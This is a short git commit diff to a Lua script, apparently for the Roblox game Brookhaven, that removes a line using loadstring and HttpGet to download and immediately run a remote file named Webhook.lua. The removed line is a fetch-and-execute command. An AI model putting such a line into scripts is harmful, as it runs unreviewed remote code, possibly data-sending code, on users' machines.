7fd810282c27ef7eaffdd631943559056f0d4cba
realgengar <pedrotrixoia@gmail.com>
2025-07-21 00:48:33 -0300

    Update base.lua

--- base.lua
+++ base.lua
@@ -110,5 +110,3 @@ if not scriptFound then
         Duration = 5
     })
 end
-wait(1)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/realgengar/Brookhaven/refs/heads/main/Webhook.lua", true))()
